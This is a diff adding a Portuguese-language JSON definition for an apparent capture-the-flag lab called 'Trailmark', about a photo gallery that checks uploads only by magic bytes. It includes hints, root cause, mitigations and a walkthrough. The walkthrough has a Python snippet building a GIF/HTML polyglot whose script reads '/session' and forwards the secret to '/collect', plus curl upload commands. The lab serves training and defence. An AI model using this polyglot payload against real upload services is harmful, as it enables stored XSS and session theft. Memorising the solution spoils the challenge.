@@ -1,0 +1,83 @@
+{
+  "slug": "upload-polyglot-image",
+  "title": "Galeria de fotos do Trailmark",
+  "codename": "TRAILMARK",
+  "summary": "Uma galeria de diário de campo valida imagens apenas pelos magic bytes. Um polyglot GIF com uma cauda HTML e JavaScript passa na checagem, é armazenado e servido de volta a partir da origem da galeria como um documento renderizável que consegue ler o endpoint de sessão do curador.",
+  "category": "upload",
+  "difficulty": "hard",
+  "kind": "challenge",
+  "lab_dir": "upload-polyglot-image",
+  "estimated_minutes": 30,
+  "xp": 240,
+  "tech": [
+    "Flask",
+    "File signature validation",
+    "Polyglot files",
+    "Media serving"
+  ],
+  "tags": [
+    "upload",
+    "polyglot",
+    "magic-bytes",
+    "stored-xss",
+    "image-validation"
+  ],
+  "story": "Trailmark é um diário de fotos para equipes de levantamento. A galeria foi endurecida contra mentiras de content-type verificando assinaturas de arquivo: um upload só é aceito quando começa com um magic number de PNG, JPEG ou GIF. A assinatura decide o nome armazenado e o tipo usado quando o arquivo é servido novamente pela mesma origem. O endpoint de sessão do curador retorna o registro do levantamento, incluindo um código secreto, e só recusa leituras cross-site iniciadas pelo navegador. A equipe assume que qualquer coisa que comece como imagem não pode fazer mais do que exibir pixels.",
+  "objective": "Envie um arquivo que satisfaça a checagem de magic-byte mas também contenha markup executável, e então prove que o arquivo armazenado executa script na origem da galeria e consegue ler o valor de `/session`.",
+  "rules": "Fique na origem loopback atribuída. A galeria e o endpoint de sessão pertencem ao mesmo engajamento. Não faça scan de outras portas nem contate hosts externos. As flags são dinâmicas e podem ser verificadas por estado.",
+  "flags": [
+    {
+      "key": "flag",
+      "label": "Flag de sessão da galeria",
+      "flag_type": "user",
+      "points": 240,
+      "required": true,
+      "requires_objective": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "Assinaturas são só os primeiros bytes",
+      "body": "`sniff()` compara `raw.startswith(...)` com alguns magic numbers. Qualquer coisa depois do header nunca é inspecionada, então um arquivo pode começar com `GIF89a` e ainda conter bytes arbitrários.",
+      "cost": 20
+    },
+    {
+      "level": 2,
+      "title": "A cauda é servida, não removida",
+      "body": "Fotos aceitas são gravadas byte a byte e servidas em `/gallery/<name>`. O tipo da response vem do tipo de imagem detectado pelo sniffing, e o ramo GIF retorna o documento ao navegador em vez de baixá-lo. Anexe HTML e uma tag `<script>` depois do header.",
+      "cost": 25
+    },
+    {
+      "level": 3,
+      "title": "Leia a sessão a partir da mesma origem",
+      "body": "`/session` retorna JSON com a flag e recusa requisições cujo header `Sec-Fetch-Site` seja `cross-site`. Script rodando a partir de `/gallery/...` é same-origin: `fetch('/session')` funciona. Envie o JSON para `/collect?c=...` e verifique `/captured`.",
+      "cost": 30
+    }
+  ],
+  "solution": {
+    "walkthrough": "O endpoint de upload é `POST /` com um campo multipart chamado `photo`. A validação é `raw.startswith(b\"GIF89a\")` (ou uma assinatura PNG/JPEG), e o nome armazenado mantém a extensão de imagem detectada pelo sniffing.\n\nMonte um polyglot GIF cuja cauda é um documento HTML:\n\n```python\nbody = (b\"GIF89a\" +\n        b\"<html><body><script>\"\n        b\"fetch('/session').then(r=>r.text())\"\n        b\".then(t=>fetch('/collect?c='+encodeURIComponent(t)))\"\n        b\"</script></body></html>\")\nopen(\"trail.gif\", \"wb\").write(body)\n```\n\n```bash\ncurl -s -F 'photo=@trail.gif;type=image/gif' http://127.0.0.1:PORT/\n# Photo accepted (image/gif) as /gallery/<hex>.gif\ncurl -s -D- http://127.0.0.1:PORT/gallery/<hex>.gif\n```\n\nA galeria retorna o arquivo com `Content-Type: text/html` (o ramo GIF da rota de serving), `Content-Disposition: inline` e os bytes originais, então o script executa na origem do Trailmark. Ele lê o registro do curador com um `fetch('/session')` same-origin:\n\n```bash\ncurl -s http://127.0.0.1:PORT/session\n# {\"user\":\"kestrel\",\"role\":\"curator\",\"flag\":\"RV{...}\"}\n```\n\ne o encaminha para `/collect`, que registra o objetivo quando a flag aparece. `GET /captured` lista o valor registrado. Um navegador que abre a URL da galeria diretamente não renderiza nada visível (o header GIF é inválido), mas o markup da cauda e o script ainda executam; um trailer GIF89a real antes do HTML (`\\x3b`) faz o polyglot também renderizar como imagem.",
+    "root_cause": "A validação por magic-byte apenas prova que um arquivo começa com um header de imagem. O uploader armazena e re-serve o fluxo de bytes completo controlado pelo atacante, deriva o tipo da response do header detectado pelo sniffing e serve pelo menos um tipo de imagem inline a partir da origem da aplicação. Um polyglot, portanto, se comporta como imagem para o validador e como documento HTML para o navegador, e script same-origin consegue alcançar o endpoint de sessão JSON.",
+    "mitigation": "Nunca re-sirva bytes enviados. Decodifique imagens com um parser real (Pillow, ImageMagick com política estrita, libvips) e recodifique para um formato raster limpo, o que também remove metadados e payloads na cauda. Sirva mídia a partir de uma origem separada sem cookies ou com `Content-Security-Policy: sandbox`, sempre envie `Content-Disposition: attachment` e `X-Content-Type-Options: nosniff`, e derive o tipo do formato decodificado em vez do header. Defenda endpoints JSON com tokens CSRF e validação de `Sec-Fetch-Site` no servidor, e mantenha segredos fora de responses que qualquer página da origem consiga buscar."
+  },
+  "references": [
+    {
+      "title": "PortSwigger — File upload vulnerabilities (polyglot files and content-type restrictions)",
+      "url": "https://portswigger.net/web-security/file-upload",
+      "source_type": "official",
+      "description": "Uploads polyglot que contornam a validação de imagem."
+    },
+    {
+      "title": "CWE-434: Unrestricted Upload of File with Dangerous Type",
+      "url": "https://cwe.mitre.org/data/definitions/434.html",
+      "source_type": "standard",
+      "description": "Classe de fraqueza para uploads cujo tipo não é realmente restrito."
+    },
+    {
+      "title": "MDN — X-Content-Type-Options",
+      "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-Content-Type-Options",
+      "source_type": "official",
+      "description": "Como o tratamento de MIME do navegador transforma um upload com tipo errado em documento."
+    }
+  ]
+}
